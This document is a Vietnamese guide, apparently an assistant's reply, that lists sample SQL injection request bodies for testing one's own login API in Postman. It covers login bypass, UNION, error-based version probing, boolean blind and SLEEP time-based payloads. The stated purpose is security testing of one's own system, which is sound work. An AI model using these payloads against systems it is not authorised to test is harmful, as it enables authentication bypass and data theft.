Dưới đây là các **request** mẫu để bạn có thể thử **tấn công SQL Injection** vào API của mình, mỗi loại SQLi sẽ có một payload khác nhau. Bạn có thể copy và paste vào **Postman** hoặc **công cụ tương tự** để thử nghiệm.

---

## 1. **Classic SQL Injection (Login Bypass cơ bản)**

### **Request Body**:
```json
{
  "username": "' OR '1'='1",
  "password": "anything"
}
```

- **Giải thích**: Câu lệnh này sẽ **bỏ qua xác thực** vì `'1'='1'` luôn đúng. Điều này giúp bạn **đăng nhập bất kỳ** mà không cần đúng mật khẩu.

---

## 2. **Union-Based SQL Injection**

### **Request Body**:
```json
{
  "username": "' UNION SELECT 1, 'hacked'--",
  "password": "anything"
}
```

- **Giải thích**: `UNION SELECT` giúp kết hợp các kết quả của câu lệnh truy vấn gốc với câu lệnh khác. Payload này sẽ trả về một giá trị giả `'hacked'` thay vì username hợp lệ.

---

## 3. **Error-Based SQL Injection**

### **Request Body**:
```json
{
  "username": "' AND 1=CAST((SELECT version()) AS INT)--",
  "password": "anything"
}
```

- **Giải thích**: Payload này sẽ gây lỗi trên hệ thống khi cố gắng ép kiểu dữ liệu, từ đó **dò phiên bản cơ sở dữ liệu** nếu lỗi trả về thông tin về DB.

---

## 4. **Blind SQL Injection (Boolean-Based)**

### **Request Body (1 - Điều kiện đúng)**:
```json
{
  "username": "' AND 1=1--",
  "password": "anything"
}
```

### **Request Body (2 - Điều kiện sai)**:
```json
{
  "username": "' AND 1=2--",
  "password": "anything"
}
```

- **Giải thích**: **Blind SQLi** không trả về thông tin rõ ràng, nhưng nếu `1=1` đúng, ứng dụng sẽ phản hồi bình thường. Ngược lại, `1=2` sẽ khiến ứng dụng phản hồi khác đi. Dựa vào sự khác biệt này, bạn có thể dò các giá trị khác.

---

## 5. **Time-Based Blind SQL Injection**

### **Request Body**:
```json
{
  "username": "' OR SLEEP(5)--",
  "password": "anything"
}
```

- **Giải thích**: Payload này sẽ **delay** (trì hoãn) phản hồi của server trong 5 giây nếu câu lệnh SQL này được thực thi, giúp bạn nhận biết rằng hệ thống đang chạy một lệnh có chứa `SLEEP`, từ đó xác định có lỗ hổng.
